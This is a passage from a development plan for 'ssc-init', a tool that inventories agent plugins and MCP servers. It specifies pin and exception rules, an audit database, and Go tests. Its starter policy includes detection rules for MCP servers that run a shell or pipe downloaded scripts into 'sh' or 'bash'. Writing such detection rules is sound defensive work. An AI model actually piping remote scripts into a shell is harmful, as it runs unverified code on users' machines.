- a pin exists and the evidence is `complete` with a different digest ⇒ `pin-mismatch`;
- a pin exists and the evidence is not `complete` ⇒ nothing (a gap the ladder already reports as UNVERIFIED);
- no pin and the evidence is `complete` ⇒ `unpinned`;
- no pin and the evidence is `unsupported` ⇒ nothing.

The rules are only evaluated when the document enables them, and each independently.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/policy -count=1 && go test -race ./internal/policy -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/policy
git commit -m "feat: evaluate pin-mismatch and unpinned independently"
```

---

### Task 7: Exceptions, expiry, and structural refusal of the four prohibited forms

**Files:**
- Create: `internal/policy/exception.go`
- Create: `internal/policy/exception_test.go`
- Modify: `internal/policy/parse.go`

Foundation §9.3. Scope is limited to a run, an exact asset/version/hash, a project, or an organization-approved scope (`[BUNDLE]`). Project exceptions expire within **30 days** by default. Four forms are **prohibited, and the engine must refuse to load a document containing them** — these are structural refusals, not warnings, the same way CI rejects them before a bundle is ever signed:

1. **publisher-wide permanent trust** — an exception with no `expiresAt`, or one whose scope is anything other than the three closed local scopes;
2. **all-version trust** — an `asset` exception whose `assetId` does not carry an exact version for a version-bearing asset family, or whose `digest` is absent;
3. **disabling a high-risk rule globally** — an exception with no scope-identifying subject, i.e. one that would apply to every asset;
4. **any exception for a known-malicious hash** — checked against the level-1 index. The index reports "no evidence available" in this build, so the refusal cannot fire against real intelligence yet; **the code path is written and tested with a fake index**, because a refusal that only appears when `[TI]` lands is a refusal nobody has ever run.

Expiry is evaluated at decision time, so an expired exception simply stops applying. It is never silently renewed, and it is reported as expired rather than dropped.

- [ ] **Step 1: Write the failing test**

```go
func TestLoadRefusesProhibitedExceptionForms(t *testing.T) {
	for name, exception := range map[string]string{
		"permanent trust":  `{"ruleId":"unpinned","scope":"project","projectId":"project:sha256:aa","reason":"r"}`,
		"unscoped":         `{"ruleId":"unpinned","scope":"project","reason":"r","expiresAt":"2026-09-01T00:00:00Z"}`,
		"all-version":      `{"ruleId":"pin-mismatch","scope":"asset","assetId":"agent-plugin:claude:helpful-utils","digest":"aa","reason":"r","expiresAt":"2026-09-01T00:00:00Z"}`,
		"no digest":        `{"ruleId":"pin-mismatch","scope":"asset","assetId":"agent-plugin:claude:helpful-utils@1.0.0","reason":"r","expiresAt":"2026-09-01T00:00:00Z"}`,
		"unknown scope":    `{"ruleId":"unpinned","scope":"publisher","publisher":"acme","reason":"r","expiresAt":"2026-09-01T00:00:00Z"}`,
		"beyond max":       `{"ruleId":"unpinned","scope":"project","projectId":"project:sha256:aa","reason":"r","expiresAt":"2027-09-01T00:00:00Z"}`,
		"unknown rule":     `{"ruleId":"no-such-rule","scope":"run","reason":"r","expiresAt":"2026-09-01T00:00:00Z"}`,
	} {
		source := `{"schemaVersion":"ssc-init.policy.v1","rules":[{"id":"unpinned","family":"pin","enabled":true,"description":"d"},{"id":"pin-mismatch","family":"pin","enabled":true,"description":"d"}],"exceptions":[` + exception + `]}`
		if _, err := policy.Load([]byte(source)); err == nil {
			t.Fatalf("%s: Load accepted a prohibited exception", name)
		}
	}
}

func TestLoadRefusesAnExceptionForAKnownMaliciousHash(t *testing.T) {
	document, err := policy.Load([]byte(validAssetExceptionDocument))
	if err != nil {
		t.Fatalf("valid exception rejected: %v", err)
	}
	if err := policy.VerifyExceptions(document, stubIndex{malicious: "3333…"}); err == nil {
		t.Fatal("an exception for a known-malicious hash was accepted")
	}
	if err := policy.VerifyExceptions(document, nil); err != nil {
		t.Fatalf("no intelligence must not manufacture a refusal: %v", err)
	}
}

func TestExpiredExceptionStopsApplyingAndIsReported(t *testing.T) {
	// One asset violating pin-mismatch, one exception covering it, evaluated
	// once before expiry (no violation, one Applied entry) and once after
	// (violation present, one Expired entry). Same document both times.
}

func TestProjectExceptionDefaultsToThirtyDays(t *testing.T) {
	// A project exception written without expiresAt is refused at load; a
	// project exception written by `policy check --explain`-style tooling gets
	// now+30d. Assert DefaultProjectExpiry == 30 * 24 * time.Hour.
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/policy -run Exception -count=1`

Expected: FAIL — `Load accepted a prohibited exception` for every case, and `undefined: policy.VerifyExceptions`.

- [ ] **Step 3: Implement**

```go
// Scope is the closed set of local exception scopes (design §9.3). An
// organization-approved scope is a fourth form that only a signed bundle can
// express ([BUNDLE]); it is absent here rather than accepted-and-ignored,
// because a local file that could grant organization scope would make the
// precedence a lie.
type Scope string

const (
	ScopeRun     Scope = "run"
	ScopeAsset   Scope = "asset"
	ScopeProject Scope = "project"
)

// DefaultProjectExpiry is design §9.3's project default.
const DefaultProjectExpiry = 30 * 24 * time.Hour

// MaxLocalExpiry bounds any local exception. §9.3 gives organization
// exceptions 90 days as a default maximum; a local exception may not outlive
// the strictest window an organization could grant.
const MaxLocalExpiry = 90 * 24 * time.Hour

type Exception struct {
	RuleID    string    `json:"ruleId"`
	Scope     Scope     `json:"scope"`
	AssetID   string    `json:"assetId,omitempty"`
	Digest    string    `json:"digest,omitempty"`
	ProjectID string    `json:"projectId,omitempty"`
	Reason    string    `json:"reason"`
	ExpiresAt time.Time `json:"expiresAt"`
}
```

`Load` validates exceptions structurally: known scope, non-zero `ExpiresAt`, `Reason` non-empty, `RuleID` naming a declared rule, the required subject field for the scope present and every other subject field absent, `asset` scope carrying both an exact version (via `inventory.ParseAssetID`, which Task 4 exported) and a `Digest`, and `ExpiresAt` within `MaxLocalExpiry` of the document's own clock-free bound (validated against `now` supplied by the caller — `Load` takes no clock, so the window check happens in `VerifyExceptions`).

`VerifyExceptions(Document, MaxLocalExpiry-aware index)` performs the level-1 refusal and returns a value-free error naming `exceptions[i]`.

At evaluation time, an exception suppresses a violation when the rule ID matches, the scope subject matches, and `input.Now.Before(exception.ExpiresAt)`. Suppressed violations become `Applied` entries; matching-but-expired ones become `Expired` entries and the violation stands.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/policy -count=1 && go test -race ./internal/policy -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/policy
git commit -m "feat: refuse prohibited exception forms at load"
```

---

### Task 8: The audit store — pins, exceptions, and decisions

**Files:**
- Modify: `internal/store/migrations.go`
- Create: `internal/store/policy.go`
- Create: `internal/store/policy_test.go`
- Modify: `internal/store/validation.go`

**Where this lives, and why.** The policy design calls the audit store "separate from the inventory snapshot"; foundation §5.3 says the shared installation holds "a single state database", and §5.2 module 7 says that store holds "asset metadata, hashes, observations, findings, decisions, exceptions, and audit history". Both are satisfied by **separate tables in the existing `state.db`**, carrying no `scan_id` and no foreign key to `scans` — exactly the pattern migration 6 established for `asset_history`, and for the same reason: pruning a snapshot must not take the record of what was approved. A second database file would duplicate `internal/store`'s hardened open path (verified parent, no-symlink guard, permission enforcement, WAL, pragma verification) for no benefit.

Editing policy still does not invalidate a snapshot, and two people with different policy documents still evaluate the same snapshot differently — those properties come from policy being absent from the *scan contract*, which it is.

- [ ] **Step 1: Write the failing test**

```go
func TestPolicyPinsSurviveSnapshotPruning(t *testing.T) {
	store, cleanup := newTestStore(t)
	defer cleanup()
	ctx := context.Background()
	base := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)

	if err := store.SavePins(ctx, []policy.Pin{{
		AssetID: "agent-plugin:claude:helpful-utils@1.0.0",
		Kind:    "tree-sha256", Subject: "payload-tree",
		Digest: "1111111111111111111111111111111111111111111111111111111111111111",
	}}, base); err != nil {
		t.Fatal(err)
	}
	for index, age := range []time.Duration{90 * 24 * time.Hour, 1 * time.Hour} {
		scan := validV3ScanFixture(t)
		scan.ScanID = fmt.Sprintf("00000000-0000-4000-8000-00000000000%d", index)
		scan.StartedAt, scan.FinishedAt = base.Add(-age), base.Add(-age)
		if err := store.saveScanAt(ctx, scan, validV3InventoryFixture(t), base); err != nil {
			t.Fatal(err)
		}
	}
	pins, err := store.Pins(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if len(pins) != 1 {
		t.Fatalf("snapshot pruning removed %d pins", 1-len(pins))
	}
}

func TestPolicyRowsRejectRawPathsAndSecrets(t *testing.T) {
	// SavePins with a digest field carrying "/Users/someone/..." and with an
	// exception reason carrying an AWS-shaped key must both error, and the
	// error must not echo the value.
}

func TestSaveScanNeverWritesPolicyRows(t *testing.T) {
	// Save a snapshot into a store that already has pins and decisions, then
	// assert the row counts are unchanged: the snapshot transaction must not
	// touch policy tables.
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/store -run Policy -count=1`

Expected: FAIL — `store.SavePins undefined`.

- [ ] **Step 3: Implement**

Append migration 7 to `migrations`:

```sql
-- Policy audit state (design §5.2 module 7, §8). Like asset_history it carries
-- no scan_id and no foreign key: pruning a snapshot must not take the record of
-- what was approved, and a pin outlives every snapshot that ever observed it.
CREATE TABLE policy_pins (
    asset_id TEXT NOT NULL,
    evidence_kind TEXT NOT NULL,
    subject TEXT NOT NULL,
    digest TEXT NOT NULL,
    pinned_at TEXT NOT NULL,
    PRIMARY KEY (asset_id, evidence_kind, subject)
);
CREATE TABLE policy_exceptions (
    rule_id TEXT NOT NULL,
    scope TEXT NOT NULL,
    subject_ref TEXT NOT NULL,
    reason TEXT NOT NULL,
    created_at TEXT NOT NULL,
    expires_at TEXT NOT NULL,
    PRIMARY KEY (rule_id, scope, subject_ref)
);
CREATE TABLE policy_decisions (
    rule_id TEXT NOT NULL,
    asset_id TEXT NOT NULL,
    level INTEGER NOT NULL CHECK (level >= 1 AND level <= 5),
    outcome TEXT NOT NULL,
    first_seen_at TEXT NOT NULL,
    last_seen_at TEXT NOT NULL,
    PRIMARY KEY (rule_id, asset_id)
);
```

Add the matching entries to `requiredColumns`, `requiredChecks` (`policy_decisions`: `check(level>=1andlevel<=5)`), and `requiredIndexFingerprints` (`pk:1:…` for each). `requiredForeignKeys` gains nothing — these tables deliberately have none, and `verifyForeignKeys` iterates `requiredColumns`, so a stray foreign key added later fails the schema check.

`internal/store/policy.go` provides `SavePins`, `Pins`, `SaveExceptions`, `Exceptions`, `RecordDecisions`, `Decisions`, and `PruneDecisions(ctx, now, window)`. Every write validates its rows through the existing gate: `validatePersistenceSafePath` on every string field and `privacy.ContainsSensitiveValue` on `reason`, returning `ErrSensitiveSnapshot` or `errUnsafeSnapshotPath` **without echoing the value**. Digests are validated as 64 lowercase hex characters — nothing else may enter a digest column.

`first_seen_at` is what makes the hook's standing/new split possible: `RecordDecisions` inserts with `first_seen_at = last_seen_at = now` and, on conflict, updates only `last_seen_at`.

`PruneDecisions` uses the asset-history window from `Options` (90 days by default), so the audit trail is bounded by the same §10 discipline as everything else. Pins and unexpired exceptions are never pruned: they are user decisions, not observations.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/store ./internal/acceptance -count=1 && go test -race ./internal/store -count=1`

Confirm a pre-existing database migrates: open a store built at migration 6, reopen it, and assert `applyMigrations` reaches 7 and `verifySchema` passes.

- [ ] **Step 5: Commit**

```bash
git add internal/store
git commit -m "feat: persist policy pins, exceptions, and decisions"
```

---

### Task 9: `ssc-init policy init` writes an annotated starter document

**Files:**
- Create: `internal/policy/starter.json`
- Create: `internal/policy/starter.go`
- Create: `internal/policy/starter_test.go`
- Modify: `internal/cli/options.go`, `internal/cli/run.go`, `internal/cli/run_test.go`
- Modify: `internal/platform/paths.go`, `internal/platform/paths_test.go`
- Modify: `cmd/ssc-init/main.go`

Shipped rules are **inert until adopted**: every rule in the starter file has `enabled: false` and a human-readable `description`. A rule firing on a fresh install would be us asserting risk about content we never analysed, tuned against machines we have never seen — it would misfire and teach the reader to ignore the section. This applies to level 5 only; organization deny (level 2) is not opt-in, and that is the point of it.

JSON has no comments, so "annotated" means the `description` field carries the annotation. `policy init` writes the embedded file **verbatim**, so the output is byte-identical across runs and machines.

- [ ] **Step 1: Write the failing test**

```go
func TestStarterDocumentShipsEveryRuleDisabled(t *testing.T) {
	document, err := policy.Load(policy.Starter())
	if err != nil {
		t.Fatalf("the shipped starter document does not parse: %v", err)
	}
	if len(document.Rules) < 5 {
		t.Fatalf("starter ships %d rules, want at least the five documented ones", len(document.Rules))
	}
	for _, rule := range document.Rules {
		if rule.Enabled {
			t.Fatalf("starter rule %q ships enabled", rule.ID)
		}
		if len(rule.Description) < 20 {
			t.Fatalf("starter rule %q has no usable description", rule.ID)
		}
	}
	for _, required := range []string{"pin-mismatch", "unpinned", "mcp-shell-command", "mutable-version", "remote-script-execution"} {
		if !hasRule(document, required) {
			t.Fatalf("starter is missing the documented rule %q", required)
		}
	}
	if len(document.Exceptions) != 0 {
		t.Fatal("starter ships an exception")
	}
}

func TestStarterIsByteStable(t *testing.T) {
	if !bytes.Equal(policy.Starter(), policy.Starter()) {
		t.Fatal("Starter is not stable")
	}
	if !bytes.HasSuffix(policy.Starter(), []byte("\n")) {
		t.Fatal("Starter does not end with a newline")
	}
}
```

Plus a `internal/cli` test: `policy init` on a temp data directory writes `policy.json` with mode `0600`, prints one line naming the redacted location, exits 0, and **refuses to overwrite an existing file** (exit 1, existing bytes unchanged).

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/policy -run Starter -count=1`

Expected: FAIL — `undefined: policy.Starter`.

- [ ] **Step 3: Implement**

`internal/policy/starter.json` (excerpt — write all five rules in this shape):

```json
{
  "schemaVersion": "ssc-init.policy.v1",
  "rules": [
    {
      "id": "pin-mismatch",
      "family": "pin",
      "enabled": false,
      "description": "A pinned asset hashes differently than approved. The asset ID carries the version, so this means the same asset at the same version has different bytes."
    },
    {
      "id": "unpinned",
      "family": "pin",
      "enabled": false,
      "description": "An asset with a trusted content digest has no pin. Every install and every upgrade mints a new asset ID, so this fires until you re-approve it with: ssc-init policy pin --update <assetID>"
    },
    {
      "id": "mcp-shell-command",
      "family": "shape",
      "enabled": false,
      "description": "An MCP server whose command is a shell. This build does not analyse what code does, so it reports the shape only: the server's real behaviour is in its arguments.",
      "match": {"assetType": ["mcp-server"], "metadataEquals": {"command": ["sh", "bash", "zsh", "dash", "ksh"]}}
    },
    {
      "id": "mutable-version",
      "family": "shape",
      "enabled": false,
      "description": "An asset pinned to a mutable version. Design section 6.3 blocks latest, unspecified versions, and mutable Git branches by default under organization policy.",
      "match": {"assetVersion": ["latest", "*", "main", "master", "HEAD", ""]}
    },
    {
      "id": "remote-script-execution",
      "family": "shape",
      "enabled": false,
      "description": "An MCP server that pipes a downloaded script straight into a shell. Design section 6.3 recommends download, verify, scan, then execute.",
      "match": {"assetType": ["mcp-server"], "metadataContains": {"args": ["| sh", "|sh", "| bash", "|bash"]}}
    }
  ]
}
```

`starter.go`:

```go
//go:embed starter.json
var starterDocument []byte

// Starter returns the shipped level-5 document, byte for byte. Every rule in it
// is disabled: a rule firing on a fresh install would assert risk about content
// this build never analysed.
func Starter() []byte { return slices.Clone(starterDocument) }
```

`internal/platform/paths.go` gains `PolicyFile string // <DataDir>/policy.json` on `InstallLayout`, populated in `Install()`. It is a sibling of `state.db`, never touched by an install, an update, or a rollback.

`internal/cli` gains `policy` as a command with a subcommand and the `--policy <path>` override (canonicalized the same way `--project-root` is: absolute, or `$HOME`-relative, no `..`, no NUL). `policy init` writes with `os.OpenFile(..., O_WRONLY|O_CREATE|O_EXCL, 0o600)` so it can never clobber an existing document, and reports the location through `platform.RedactHome`.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/policy ./internal/cli ./internal/platform ./cmd/ssc-init -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/policy internal/cli internal/platform cmd/ssc-init
git commit -m "feat: write an annotated starter policy with every rule disabled"
```

---

### Task 10: `ssc-init policy pin` — trust on first use, with the caveat in the output

**Files:**
- Modify: `internal/cli/options.go`, `internal/cli/run.go`, `internal/cli/run_test.go`
- Modify: `cmd/ssc-init/main.go`

Pins are seeded trust-on-first-use and re-approved explicitly. **The command itself must state the caveat, not only the documentation:** pinning records whatever is on the machine right now, so pinning a compromised machine approves the compromise. A pin protects against future change, never against what is already there.

Under an organization bundle, pins are authored in the bundle and TOFU is unavailable — level 3 is not something a local machine may self-grant. That branch is `[BUNDLE]`; today `Sources.Bundle` is always nil, so `policy pin` always runs, and the code that would refuse it is one `if` with a test against a non-nil `Bundle`.

`policy pin` reads the latest snapshot and pins every asset with `complete` evidence. `policy pin --update <assetID>` re-approves exactly one asset and refuses an asset ID that is absent from the latest snapshot.

- [ ] **Step 1: Write the failing test**

```go
func TestPolicyPinEchoesTheTrustOnFirstUseCaveat(t *testing.T) {
	var stdout, stderr bytes.Buffer
	app := cli.App{Version: "test", StatusReader: snapshotWithCompleteEvidence(t), PolicyStore: newPolicyStore(t)}
	if code := app.Run(context.Background(), []string{"policy", "pin"}, &stdout, &stderr); code != 0 {
		t.Fatalf("policy pin exited %d: %s", code, stderr.String())
	}
	output := stdout.String()
	for _, phrase := range []string{
		"records what is on this machine now",
		"pinning a compromised machine approves the compromise",
	} {
		if !strings.Contains(output, phrase) {
			t.Fatalf("policy pin did not state the caveat: %q", output)
		}
	}
}

func TestPolicyPinUpdateRejectsAnUnknownAsset(t *testing.T) {
	// exit 1, no pin written, and the message names no path and echoes no
	// asset ID it did not receive.
}

func TestPolicyPinRefusesUnderAnOrganizationBundle(t *testing.T) {
	// Sources.Bundle non-nil ⇒ exit 1 with "pins are authored in the
	// organization bundle". [BUNDLE] path, tested now so it is not written
	// blind later.
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/cli -run PolicyPin -count=1`

Expected: FAIL — `cli.App has no field PolicyStore`.

- [ ] **Step 3: Implement**

`cli.App` gains a `PolicyStore` interface (`Pins`, `SavePins`, `Exceptions`, `RecordDecisions`, `Decisions`) satisfied by `*store.Store`, following the existing `StatusReader`/`Doctor` seam shape. The caveat is printed **before** the pin count, so it is not scrolled off by a long list:

```
ssc-init: pinning records what is on this machine now.
  A pin protects against future change, not against what is already there —
  pinning a compromised machine approves the compromise.
  pinned 34 assets (7 already pinned, unchanged)
```

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/cli ./cmd/ssc-init -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/cli cmd/ssc-init
git commit -m "feat: seed pins with the trust-on-first-use caveat in the output"
```

---

### Task 11: `ssc-init policy check` — reads the latest snapshot, scans nothing, exits nonzero

**Files:**
- Modify: `internal/cli/run.go`, `internal/cli/options.go`, `internal/cli/run_test.go`
- Create: `internal/report/policy.go`, `internal/report/policy_test.go`

Same engine as the hook, different exit-code policy. It lists every violation, standing and new, and **states which precedence levels are active and which are inert**.

It reads exactly two things: the policy document and the latest snapshot. It runs no collector, touches no collector root, executes no process, and opens no socket — so adopting a rule and seeing what it would flag against yesterday's inventory is instant, and CI can evaluate a committed snapshot without touching a developer's machine.

Exit codes: `0` clean, `3` violations present, `2` invalid arguments or a document that fails to load, `1` operational failure. `3` is separate from `1` on purpose: a CI gate must be able to tell "the policy says no" from "the tool broke". (See *Open decisions* — the design says only "exits nonzero".)

- [ ] **Step 1: Write the failing test**

```go
func TestPolicyCheckExitsThreeOnViolationAndNamesInertLevels(t *testing.T) {
	var stdout, stderr bytes.Buffer
	app := cli.App{Version: "test", StatusReader: snapshotWithUnpinnedAsset(t), PolicyStore: newPolicyStore(t),
		PolicyDocument: mustLoad(t, pinRulesEnabled)}
	code := app.Run(context.Background(), []string{"policy", "check", "--json"}, &stdout, &stderr)
	if code != 3 {
		t.Fatalf("policy check exited %d, want 3", code)
	}
	var payload struct {
		SchemaVersion string `json:"schemaVersion"`
		Capability    string `json:"capability"`
		Levels        []struct {
			Number int    `json:"level"`
			Active bool   `json:"active"`
			Reason string `json:"reason"`
		} `json:"levels"`
		Violations []struct {
			RuleID string `json:"ruleId"`
		} `json:"violations"`
	}
	if err := json.Unmarshal(stdout.Bytes(), &payload); err != nil {
		t.Fatal(err)
	}
	if payload.SchemaVersion != "ssc-init.policy-check.v1" || payload.Capability != "advisory" {
		t.Fatalf("unexpected header: %+v", payload)
	}
	if len(payload.Levels) != 5 || payload.Levels[0].Active || payload.Levels[0].Reason != "no evidence available" {
		t.Fatalf("levels are not reported truthfully: %+v", payload.Levels)
	}
	if len(payload.Violations) != 1 || payload.Violations[0].RuleID != "unpinned" {
		t.Fatalf("unexpected violations: %+v", payload.Violations)
	}
}

func TestPolicyCheckTouchesNoCollectorRoot(t *testing.T) {
	// Point HOME at a temp directory seeded with an agent plugin, run
	// policy check against an in-memory snapshot, and assert the plugin file's
	// atime/mtime are unchanged and no collector ran (the store's LatestSnapshot
	// is the only call recorded by the fake).
}

func TestPolicyCheckExitsTwoOnAnUnloadableDocument(t *testing.T) {
	// The message names the location inside the document, echoes no value, and
	// is distinguishable from exit 3.
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/cli -run PolicyCheck -count=1`

Expected: FAIL — `policy check exited 2, want 3` (the subcommand is unknown).

- [ ] **Step 3: Implement**

`policy check` supports `--json` (default) and `--pretty`. The JSON payload:

```json
{
  "schemaVersion": "ssc-init.policy-check.v1",
  "capability": "advisory",
  "levels": [
    {"level": 1, "name": "known-malicious-evidence", "active": false, "reason": "no evidence available"},
    {"level": 2, "name": "organization-deny", "active": false, "reason": "no bundle present"},
    {"level": 3, "name": "organization-allow", "active": false, "reason": "no bundle present"},
    {"level": 4, "name": "user-exceptions", "active": true},
    {"level": 5, "name": "default-product-policy", "active": true}
  ],
  "snapshot": {"scanId": "…", "finishedAt": "2026-08-09T09:12:44Z"},
  "violations": [
    {"ruleId": "unpinned", "level": 5, "assetId": "agent-plugin:claude:helpful-utils@1.2.0",
     "assetType": "agent-plugin", "assetName": "helpful-utils", "host": "claude", "standing": false}
  ]
}
```

`capability` is the string `advisory`. Foundation §5.1 requires an adapter never to claim enforcement when only advisory scanning is possible, and the same obligation binds the core. No output may describe the nonzero exit as blocking.

`--pretty` reuses the shared row renderer from Task 4 through the `POLICY` section formatter Task 12 adds, so there is one row format in the product.

`policy check` also calls `RecordDecisions`, which is what gives Task 12 its standing/new split.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/cli ./internal/report ./cmd/ssc-init -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/cli internal/report cmd/ssc-init
git commit -m "feat: gate on policy without scanning"
```

---

### Task 12: The hook's `POLICY` section and the standing-violations line

**Files:**
- Modify: `internal/report/hook.go`, `internal/report/hook_test.go`
- Modify: `internal/report/policy.go`
- Modify: `internal/cli/run.go`, `internal/cli/run_test.go`
- Modify: `cmd/ssc-init/main.go`

The hook stays advisory and **always exits 0**. Blocking session start because a plugin auto-updated would be hostile, and the advisory contract is locked and tested.

Violations render in their own section below the severity ladder — a section, not a rung, because a rung would collapse an asset's multiple violations into one line and lose the rule names, which are the actionable content; because the ladder answers *what moved* while policy answers *what violates my expectations*; and because a violation needs no change at all — a plugin quietly violating a rule for six months has no rung and would otherwise be invisible.

```
ssc-init: 3 changes since last snapshot
  NEW        agent-plugin  helpful-utils (claude)
  NEW        mcp-server    helpful-utils (claude-code)
  CHANGED    ide-extension prettier-vscode (vscode)

POLICY (2 violations)
  no-shell-mcp        mcp-server    helpful-utils (claude-code)
  unpinned            agent-plugin  helpful-utils (claude)
```

**Standing violations do break the silence rule** — the one place policy departs from `UNVERIFIED`. A quiet machine prints exactly one line:

```
ssc-init: 2 policy violations standing (run: ssc-init policy check)
```

New violations get detail lines; standing ones collapse to that count. A coverage gap is the tool admitting what it cannot do, and nagging about it teaches the reader to ignore the hook. A violation is the tool reporting what the user said should not be — a to-do, not a boundary. Suppressing it would make silence a lie. One line, never the full list.

- [ ] **Step 1: Write the failing test**

```go
func TestHookRendersPolicySectionBelowTheLadder(t *testing.T) {
	var buffer bytes.Buffer
	err := report.WriteHookSummary(&buffer, hookInventory(t), hookDelta(t), false, policy.Result{
		Violations: []policy.Violation{
			{RuleID: "no-shell-mcp", Level: 5, AssetID: "mcp:claude-code:helpful-utils",
				AssetType: "mcp-server", AssetName: "helpful-utils", Host: "claude-code"},
			{RuleID: "unpinned", Level: 5, AssetID: "agent-plugin:claude:helpful-utils@1.0.0",
				AssetType: "agent-plugin", AssetName: "helpful-utils", Host: "claude"},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	want := "ssc-init: 3 changes since last snapshot\n" +
		"  NEW        agent-plugin  helpful-utils (claude)\n" +
		"  NEW        mcp-server    helpful-utils (claude-code)\n" +
		"  CHANGED    ide-extension prettier-vscode (vscode)\n" +
		"\n" +
		"POLICY (2 violations)\n" +
		"  no-shell-mcp        mcp-server    helpful-utils (claude-code)\n" +
		"  unpinned            agent-plugin  helpful-utils (claude)\n"
	if buffer.String() != want {
		t.Fatalf("hook output mismatch:\ngot:\n%s\nwant:\n%s", buffer.String(), want)
	}
}

func TestQuietMachineWithStandingViolationsPrintsExactlyOneLine(t *testing.T) {
	var buffer bytes.Buffer
	result := policy.Result{Violations: []policy.Violation{
		{RuleID: "unpinned", AssetID: "a", Standing: true},
		{RuleID: "unpinned", AssetID: "b", Standing: true},
	}}
	if err := report.WriteHookSummary(&buffer, model.Inventory{}, model.Delta{}, false, result); err != nil {
		t.Fatal(err)
	}
	want := "ssc-init: 2 policy violations standing (run: ssc-init policy check)\n"
	if buffer.String() != want {
		t.Fatalf("got %q, want %q", buffer.String(), want)
	}
}

func TestQuietMachineWithNoViolationsStaysSilent(t *testing.T) {
	var buffer bytes.Buffer
	if err := report.WriteHookSummary(&buffer, model.Inventory{}, model.Delta{}, false, policy.Result{}); err != nil {
		t.Fatal(err)
	}
	if buffer.Len() != 0 {
		t.Fatalf("hook broke silence with %q", buffer.String())
	}
}

func TestHookNeverPrintsAStandingViolationDetailLine(t *testing.T) {
	// A delta with changes plus one new and three standing violations: the
	// POLICY section lists the new one and the standing count only.
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/report -run Hook -count=1`

Expected: FAIL — `too many arguments in call to report.WriteHookSummary`.

- [ ] **Step 3: Implement**

`WriteHookSummary` takes a fifth parameter, `policy.Result`. Its early return changes from "empty delta writes nothing" to "empty delta and no violations writes nothing"; with an empty delta and standing violations it writes the one-line form and returns.

The `POLICY` section uses the Task 4 renderer with a 19-wide label column: `render(violation.RuleID, 19, row)`. Rule IDs are bounded at 32 characters by the Task 1 pattern, and a longer-than-19 ID pushes its row rather than truncating — a truncated rule ID is not actionable.

`cmd/ssc-init` loads the document (absent document ⇒ zero `policy.Result` ⇒ nothing rendered, which is the correct behaviour for a user who never ran `policy init`), evaluates after the scan and before the render, and records decisions. **A failure to load the policy document must not fail the hook**: it prints one line to stderr and renders the ladder without a POLICY section, still exiting 0.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/report ./internal/cli ./internal/acceptance ./cmd/ssc-init -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/report internal/cli cmd/ssc-init
git commit -m "feat: report policy violations in the hook"
```

---

### Task 13: Preserve the signed-policy retention seam

**Files:**
- Modify: `internal/policy/document.go`, `internal/policy/parse.go`, `internal/policy/parse_test.go`
- Modify: `cmd/ssc-init/main.go`, `cmd/ssc-init/main_test.go`
- Modify: `internal/doctor/doctor.go` (comment only), `internal/store/snapshots.go` (comment only)

Program B added `store.Options` as the in-process seam a future verified organization bundle will use. Foundation §10 explicitly scopes retention configuration to signed policy, so a local level-5 document must not read this seam. This task documents and tests that boundary without adding local configuration.

- [ ] **Step 1: Write the failing test**

```go
func TestLocalPolicyCannotConfigureRetention(t *testing.T) {
	_, err := policy.Load([]byte(`{"schemaVersion":"ssc-init.policy.v1","rules":[],"retention":{"snapshotDays":7}}`))
	if err == nil {
		t.Fatal("local policy accepted signed-policy-only retention configuration")
	}
}
```

`internal/policy` does not import `internal/store`. `store.Options` remains the
in-process signed-bundle seam, while the binary opens the store with defaults
until a verified organization-bundle loader exists.

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/policy -run Retention -count=1`

Expected: FAIL until `retention` is removed from the local document shape.

- [ ] **Step 3: Implement**

Remove `Retention` from `policy.Document` and reject `retention` as an unknown top-level field. Keep `store.Options` unchanged as the in-process seam for the future verified-bundle loader. Update comments in `internal/store/snapshots.go` and `internal/doctor/doctor.go` to say the seam is reserved for signed organization policy.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/policy ./internal/store ./internal/doctor ./cmd/ssc-init -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/policy internal/store internal/doctor cmd/ssc-init
git commit -m "docs: reserve retention controls for signed policy"
```

---

### Task 14: Acceptance, contract isolation, and the truthfulness pass

**Files:**
- Create: `internal/acceptance/policy_test.go`
- Modify: `internal/acceptance/usecase_matrix_test.go`
- Modify: `README.md`, `CLAUDE.md`

One isolated-home end-to-end run, one contract-isolation assertion, and a documentation pass that states only what the build does.

The end-to-end path is foundation §13 acceptance test 8 reduced to its local subset: *apply a scoped exception, and re-block after expiry*. The organization-signed half is `[BUNDLE]`; the exception and expiry half is buildable and must be proven.

- [ ] **Step 1: Write the failing test**

`internal/acceptance/policy_test.go`:

```go
func TestPolicyLifecycleAgainstAnIsolatedHome(t *testing.T) {
	// 1. Isolated home with one agent plugin fixture. Baseline scan.
	// 2. policy init  → every rule disabled → policy check exits 0.
	// 3. Enable unpinned → policy check exits 3 with one violation.
	// 4. policy pin    → policy check exits 0.
	// 5. Mutate the fixture's bytes, re-scan → policy check exits 3 with
	//    exactly one pin-mismatch violation and no unpinned violation.
	// 6. Add a project-scoped exception expiring in 30 days → exits 0, one
	//    exceptionsApplied entry.
	// 7. Evaluate with a clock past the expiry → exits 3 again, one
	//    exceptionsExpired entry. Same document both times.
}

func TestPolicyNeverEntersTheScanContract(t *testing.T) {
	// Run the same baseline scan twice against one isolated home, once with a
	// policy document present and enabled rules that fire, once with none.
